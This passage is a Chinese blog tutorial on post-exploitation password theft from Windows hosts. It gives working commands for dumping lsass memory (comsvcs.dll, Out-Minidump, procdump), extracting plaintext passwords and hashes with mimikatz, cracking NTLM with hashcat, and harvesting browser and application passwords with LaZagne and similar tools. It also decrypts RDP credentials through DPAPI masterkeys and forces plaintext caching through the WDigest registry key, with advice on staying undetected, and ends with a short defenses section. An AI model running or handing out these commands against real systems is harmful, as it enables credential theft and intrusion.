+<p><img src="/img/image-20231011105344474.png" srcset="/img/loading.gif" lazyload alt="image-20231011105344474"></p>
+<p><img src="/img/image-20231011105400352.png" srcset="/img/loading.gif" lazyload alt="image-20231011105400352"></p>
+<p>下载即可</p>
+<p>3、使用PowerSploit 的Out-MiniDump模块，PowerSploit是一个基于 Powershell 的渗透工具包，可以选择创建 进程的完整内存转储。</p>
+<p>地址  <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</a></p>
+<p><img src="/img/image-20231011105807265.png" srcset="/img/loading.gif" lazyload alt="image-20231011105807265"></p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">Minidump</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Process</span> <span class="hljs-variable">lsass</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">Minidump</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011110452665.png" srcset="/img/loading.gif" lazyload alt="image-20231011110452665"></p>
+<p>4、comsvcs.dll，系统自带。</p>
+<p>通过comsvcs.dll的导出函数MiniDump实现dump内存 </p>
+<figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs profile">首先查看lsass.exe进程PID: tasklist | findstr lsass.exe <br><br>使用powershell导出 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 496 C:\lsass.dmp full<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011111319463.png" srcset="/img/loading.gif" lazyload alt="image-20231011111319463"></p>
+<p><img src="/img/image-20231011111311782.png" srcset="/img/loading.gif" lazyload alt="image-20231011111311782"></p>
+<h3 id="读取lsass-dmp文件"><a href="#读取lsass-dmp文件" class="headerlink" title="读取lsass.dmp文件"></a>读取lsass.dmp文件</h3><p>使用mimikatz读取lsass.dmp文件</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011112003437.png" srcset="/img/loading.gif" lazyload alt="image-20231011112003437"></p>
+<h2 id="5-使用Hashcat和在线工具破解NTLM-Hash"><a href="#5-使用Hashcat和在线工具破解NTLM-Hash" class="headerlink" title="5.使用Hashcat和在线工具破解NTLM Hash"></a>5.使用Hashcat和在线工具破解NTLM Hash</h2><h3 id="Hashcat介绍"><a href="#Hashcat介绍" class="headerlink" title="Hashcat介绍"></a>Hashcat介绍</h3><p>Hashcat是一个密码恢复工具。直到2015年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于 Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt 格式，以及 MySQL 和 Cisco PIX 中使用的算法。</p>
+<p>下载地址： <a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a> </p>
+<p>Hashcat的官网是Hashcat.net ,点击进去后会有两个下载选项，我们选择hashcat binaries，这个是直接可以在 Windows下运行的</p>
+<img src="/img/image-20231011113256689.png" srcset="/img/loading.gif" lazyload alt="image-20231011113256689" style="zoom:80%;" />
+
+<h3 id="使用hashcat破解NTLM-Hash"><a href="#使用hashcat破解NTLM-Hash" class="headerlink" title="使用hashcat破解NTLM Hash"></a>使用hashcat破解NTLM Hash</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">1000</span> NTLM HASH 字典 ‐‐force<br>hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">1000</span> e45a314c664d40a227f9540121d1a29d dictTest<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--force</span> <br>(笔记本上可能会出现问题 硬件原因)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011115113962.png" srcset="/img/loading.gif" lazyload alt="image-20231011115113962"></p>
+<h3 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h3><p><a target="_blank" rel="noopener" href="https://hashes.com/zh/decrypt/hash">https://hashes.com/zh/decrypt/hash</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://md5decrypt.net/en/#answer">https://md5decrypt.net/en/#answer</a></p>
+<p><img src="/img/image-20231011115201403.png" srcset="/img/loading.gif" lazyload alt="image-20231011115201403"></p>
+<h2 id="6-浏览器、数据库等密码的抓取"><a href="#6-浏览器、数据库等密码的抓取" class="headerlink" title="6.浏览器、数据库等密码的抓取"></a>6.浏览器、数据库等密码的抓取</h2><h3 id="BrowserGhost浏览器抓取（不太好用）"><a href="#BrowserGhost浏览器抓取（不太好用）" class="headerlink" title="BrowserGhost浏览器抓取（不太好用）"></a>BrowserGhost浏览器抓取（不太好用）</h3><p>这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下： </p>
+<p>实现system抓机器上其他用户的浏览器密码(方便横向移动时快速凭据采集) </p>
+<p>用.net2 实现可兼容大部分windows，并去掉依赖(不需要System.Data.SQLite.dll这些累赘) </p>
+<p>可以解密chrome全版本密码(chrome80版本后加密方式变了) </p>
+<p>Chrome已经可以获取login data、cookie、history、book了 </p>
+<p>命令：BrowserGhost.exe</p>
+<img src="/img/image-20231011144853082.png" srcset="/img/loading.gif" lazyload alt="image-20231011144853082" style="zoom:80%;" />
+
+<h3 id="Sharp-HackBrowserData浏览器"><a href="#Sharp-HackBrowserData浏览器" class="headerlink" title="Sharp-HackBrowserData浏览器"></a>Sharp-HackBrowserData浏览器</h3><p>Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi等常见的浏览器都能抓 </p>
+<p>命令：hack-browser-data-windows-64bit.exe</p>
+<img src="/img/image-20231011165224088.png" srcset="/img/loading.gif" lazyload alt="image-20231011165224088" style="zoom:80%;" />
+
+<p><img src="/img/image-20231011165210980.png" srcset="/img/loading.gif" lazyload alt="image-20231011165210980"></p>
+<h3 id="SharpDecryptPwd数据库"><a href="#SharpDecryptPwd数据库" class="headerlink" title="SharpDecryptPwd数据库"></a>SharpDecryptPwd数据库</h3><p>SharpDecryptPwd-master对密码已保存在 Windwos 系统上的部分程序进行解析,包括Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐TeamViewer<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐FileZilla<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐WinSCP<br>SharpDecryptPwd<span class="hljs-selector-class">.exe</span> ‐Xmangager ‐<span class="hljs-selector-tag">p</span> Session_Path<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011165354467.png" srcset="/img/loading.gif" lazyload alt="image-20231011165354467" style="zoom:80%;" />
+
+<h3 id="LaZagne各类密码"><a href="#LaZagne各类密码" class="headerlink" title="LaZagne各类密码"></a>LaZagne各类密码</h3><p>是⽤于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算 法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。 </p>
+<p>命令：laZagne.exe all</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span><br>laZagne<span class="hljs-selector-class">.exe</span> browsers<br>laZagne<span class="hljs-selector-class">.exe</span> browsers ‐firefox<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐oN<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐oA ‐output C:\Users\test\Desktop<br>laZagne<span class="hljs-selector-class">.exe</span> ‐h<br>laZagne<span class="hljs-selector-class">.exe</span> browsers ‐h<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐vv<br>laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span> ‐quiet ‐oA<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-Windows其他类型抓取NTLM-HASH工具"><a href="#7-Windows其他类型抓取NTLM-HASH工具" class="headerlink" title="7.Windows其他类型抓取NTLM HASH工具"></a>7.Windows其他类型抓取NTLM HASH工具</h2><h3 id="getpassword"><a href="#getpassword" class="headerlink" title="getpassword"></a>getpassword</h3><p>打开GetPass工具所在的目录。打开命令行环境。运行64位程GetPassword。运行该程序后,即可获得明文密码</p>
+<p><img src="/img/image-20231011170339851.png" srcset="/img/loading.gif" lazyload alt="image-20231011170339851"></p>
+<h3 id="pwdump7"><a href="#pwdump7" class="headerlink" title="pwdump7"></a>pwdump7</h3><p>在命令行环境中运行PwDump7程序,可以得到系统中所有账户的NTLMHash</p>
+<p><img src="/img/image-20231011170639628.png" srcset="/img/loading.gif" lazyload alt="image-20231011170639628"></p>
+<h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a>QuarksPwDump</h3><p>下载QuarksPwDump.exe,在命令行环境中输人 QuarksPwDump.exe –dump-hash-local 导出三个用户的NLMHash</p>
+<p><img src="/img/image-20231011170850242.png" srcset="/img/loading.gif" lazyload alt="image-20231011170850242"></p>
+<h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang中的 GET-PASSHashes.ps1可以可以获取hash</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span>‐<span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHashes</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span>‐<span class="hljs-variable">PassHashes</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011171055766.png" srcset="/img/loading.gif" lazyload alt="image-20231011171055766"></p>
+<h3 id="wce"><a href="#wce" class="headerlink" title="wce"></a>wce</h3><p>这款工具是一款Hash注入神器，不仅可以用于Hash注入，也可以直接获取明文或Hash。这款工具也分为32位和 64位两个不同的版本：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml">‐l 列出登录的会话和NTLM凭据（默认值）<br>‐s 修改当前登录会话的NTLM凭据 参数：<span class="hljs-tag">&lt;<span class="hljs-name">用户名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">域名</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">LM哈希</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">NT哈希</span>&gt;</span><br>‐r 不定期的列出登录的会话和NTLM凭据，如果找到新的会话，那么每5秒重新列出一次<br>‐c 用一个特殊的NTML凭据运行一个新的会话 参数：<br>‐e 不定期的列出登录的会话和NTLM凭据，当产生一个登录事件的时候重新列出一次<br>‐o 保存所有的输出到一个文件 参数:<span class="hljs-tag">&lt;<span class="hljs-name">文件名</span>&gt;</span><br>‐i 指定一个LUID代替使用当前登录会话 参数:<br>‐d 从登录会话中删除NTLM凭据 参数:<br>‐a 使用地址 参数: <span class="hljs-tag">&lt;<span class="hljs-name">地址</span>&gt;</span><br>‐f 强制使用安全模式<br>‐g 生成LM和NT的哈希 参数<span class="hljs-tag">&lt;<span class="hljs-name">密码</span>&gt;</span><br>‐K 缓存kerberos票据到一个文件（unix和windows wce格式）<br>‐k 从一个文件中读取kerberos票据并插入到windows缓存中<br>‐w 通过摘要式认证缓存一个明文的密码<br>‐v 详细输出<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-Windows-RDP凭证抓取和密码破解"><a href="#8-Windows-RDP凭证抓取和密码破解" class="headerlink" title="8.Windows RDP凭证抓取和密码破解"></a>8.Windows RDP凭证抓取和密码破解</h2><h3 id="破解原理"><a href="#破解原理" class="headerlink" title="破解原理"></a>破解原理</h3><p>Credentials的解密是Windows系统信息收集中非常重要的一环，其中包括各类敏感、重要的凭证（这个可以理解为密码），接下来我们就讲解RDP凭证的抓取和破解 </p>
+<p>在我们点击保存密码后，Windows就通过MasterKey将我们的密码加密后保存在本地，由于Windows还需要解密从而使用，所以这个过程是可逆，也正因为这一缘由，我们只要拿到MasterKey就能将密码解出来。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">win+<span class="hljs-built_in">r</span>  mstsc  打开远程桌面连接<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011174133403.png" srcset="/img/loading.gif" lazyload alt="image-20231011174133403" style="zoom:67%;" />
+
+<img src="/img/image-20231011201859928.png" srcset="/img/loading.gif" lazyload alt="image-20231011201859928" style="zoom: 67%;" />
+
+<h3 id="凭证的查看"><a href="#凭证的查看" class="headerlink" title="凭证的查看"></a>凭证的查看</h3><p>查看凭证命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看mstsc的连接记录<br>cmdkey /list<br>查找本地的Credentials<br><span class="hljs-built_in">dir</span> /a %userprofile%\appdata\<span class="hljs-built_in">local</span>\microsoft\credentials\*<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011202011697.png" srcset="/img/loading.gif" lazyload alt="image-20231011202011697" style="zoom:67%;" />
+
+<img src="/img/image-20231011202106061.png" srcset="/img/loading.gif" lazyload alt="image-20231011202106061" style="zoom:67%;" />
+
+<p>F49CBB3FE896E7F0A076E3E20D6224BE</p>
+<h3 id="在线破解"><a href="#在线破解" class="headerlink" title="在线破解"></a>在线破解</h3><p>1、使用mimikatz获取该文件的MasterKey的guid</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">mimikatz <span class="hljs-name">dpapi</span>::cred /<span class="hljs-name">in</span>:<span class="hljs-name">C</span>:\Users\Administrator\appdata\local\microsoft\credentials\F49CBB3FE896E7F0A076E3E20D6224BE<br></code></pre></td></tr></table></figure>
+
+<p>以用于加密凭据文件F49CBB3FE896E7F0A076E3E20D6224BE的MasterKey的guid就是：{e6f05b31-8adb-4ae8-9951-91676a3e869c}，所以我们只要从内存中找到这个guid对应的MasterKey的值即可</p>
+<p><img src="/img/image-20231011202807404.png" srcset="/img/loading.gif" lazyload alt="image-20231011202807404"></p>
+<p>guid：{e6f05b31-8adb-4ae8-9951-91676a3e869c}</p>
+<p>2、找到内存中对应的MasterKey</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::dpapi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011202930916.png" srcset="/img/loading.gif" lazyload alt="image-20231011202930916"></p>
+<p>通过guid找到对应的masterkey：6e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054</p>
+<p>3、最后打开mimikatz通过MasterKey值去解密凭据文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dpapi::cred <span class="hljs-regexp">/in:凭据文件路径 /m</span>asterky:masterkey值<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz dpapi::cred<br>/in:C:\Users\Administrator\appdata\<span class="hljs-built_in">local</span>\microsoft\credentials\F49CBB3FE896E7F0A076E3E20D6224BE /masterkey:6e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011203443828.png" srcset="/img/loading.gif" lazyload alt="image-20231011203443828" style="zoom:80%;" />
+
+<h3 id="离线破解-建议"><a href="#离线破解-建议" class="headerlink" title="离线破解(建议)"></a>离线破解(建议)</h3><p>由于我们不能保证我们的mimikatz是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目 的其实很简单，就是把目标的文件和内存下载回来，在vps或本机上进行mimikatz解密即可。</p>
+<p>1、下载目标内存</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass1 导出lsass<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011204045521.png" srcset="/img/loading.gif" lazyload alt="image-20231011204045521" style="zoom:67%;" />
+
+<p>2、下载目标的Credentials文件</p>
+<img src="/img/image-20231011205234232.png" srcset="/img/loading.gif" lazyload alt="image-20231011205234232" style="zoom:80%;" />
+
+<p>F49CBB3FE896E7F0A076E3E20D6224BE</p>
+<p>3、用mimikatz载入dump回来的内存</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Sekurlsa::minidump lsass1.dump<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011205414273.png" srcset="/img/loading.gif" lazyload alt="image-20231011205414273" style="zoom:80%;" />
+
+<p>4、获取Credentials的GUID</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">dpapi::cred /in:F49CBB3FE896E7F0A076E3E20D6224BE<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011205528272.png" srcset="/img/loading.gif" lazyload alt="image-20231011205528272" style="zoom:67%;" />
+
+<p>{e6f05b31-8adb-4ae8-9951-91676a3e869c}</p>
+<p>5、获取内存中所有的MasterKey</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlsa::dpapi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011205634989.png" srcset="/img/loading.gif" lazyload alt="image-20231011205634989"></p>
+<p>6e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054</p>
+<p>6、利用MasterKey解密</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dpapi::cred <span class="hljs-regexp">/in:F49CBB3FE896E7F0A076E3E20D6224BE /m</span>asterkey:<span class="hljs-number">6</span>e0e7e7b41d73db67afbc25a1554847dcff9dfe8ba8a8e6b123bf9f2026a1c6bc1fbb44874f8d80b046e889d0636793f48bfcfbb9457f65880ff8843fff0c054<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011205803451.png" srcset="/img/loading.gif" lazyload alt="image-20231011205803451" style="zoom:80%;" />
+
+
+
+<h2 id="9-window2018-R2之后抓取密码的方式"><a href="#9-window2018-R2之后抓取密码的方式" class="headerlink" title="9.window2018-R2之后抓取密码的方式"></a>9.window2018-R2之后抓取密码的方式</h2><p>在Windows2012系统及以上的系统，默认在内存缓存中禁止保存明文密码的。</p>
+<p>攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug 提升为debug权限<br>sekurlsa::logonPasswords 通过以上各种方法读取明文密码<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011211405458.png" srcset="/img/loading.gif" lazyload alt="image-20231011211405458" style="zoom: 67%;" />
+
+<h3 id="修改注册表和锁屏"><a href="#修改注册表和锁屏" class="headerlink" title="修改注册表和锁屏"></a>修改注册表和锁屏</h3><p>修改注册表</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 开启</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011212911096.png" srcset="/img/loading.gif" lazyload alt="image-20231011212911096"></p>
+<p>锁屏</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">rundll32.exe user32.dll,LockWorkStation 锁屏<br><br>query <span class="hljs-keyword">user</span> <span class="hljs-title">查询登录</span><br><span class="hljs-title">logoff</span> ID 下载<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231011212832369.png" srcset="/img/loading.gif" lazyload alt="image-20231011212832369"></p>
+<img src="/img/image-20231011213003231.png" srcset="/img/loading.gif" lazyload alt="image-20231011213003231" style="zoom:67%;" />
+
+<p>抓取密码</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug 提升为debug权限<br>sekurlsa::logonPasswords 通过以上各种方法读取明文密码<br></code></pre></td></tr></table></figure>
+
+<img src="/img/image-20231011213350075.png" srcset="/img/loading.gif" lazyload alt="image-20231011213350075" style="zoom:67%;" />
+
+
+
+<h2 id="10-windows密码抓取防范措施"><a href="#10-windows密码抓取防范措施" class="headerlink" title="10.windows密码抓取防范措施"></a>10.windows密码抓取防范措施</h2><h3 id="2012R2域控设置"><a href="#2012R2域控设置" class="headerlink" title="2012R2域控设置"></a>2012R2域控设置</h3><p>在windows server 2012 R2中，新增了一个Protected Users 安全组，将用户加入到该组，用户的明文密码就不会 被获取</p>
+<p><img src="/img/image-20231011213450667.png" srcset="/img/loading.gif" lazyload alt="image-20231011213450667"></p>
+<h3 id="安装KB2871997"><a href="#安装KB2871997" class="headerlink" title="安装KB2871997"></a>安装KB2871997</h3><p>2014年，Microsoft发布了KB2871997补丁，它主要囊括了Windows 8.1和Windows Server 2012 R2中增强的安 全保护机制。所以，以往的例如：Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012 也可以更新该补丁后获得上述安全保护机制。该补丁无法阻止”哈希传递“的攻击方式，但其确实有助于是Windows 免受一些常见的攻击，例如：明文密码脱取、RDP凭据盗取、盗取本地Administrator账户进行横向移动。</p>
+<h3 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f 关闭</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" class="category-chain-item">后渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网-Windows密码抓取</div>
+      <div>http://example.com/2023/11/03/内网-Windows密码抓取/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/03/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="内网横向移动">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网横向移动</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/03/%E5%86%85%E7%BD%91-Windows%E8%AE%A4%E8%AF%81/" title="内网-Windows认证">
+                        <span class="hidden-mobile">内网-Windows认证</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
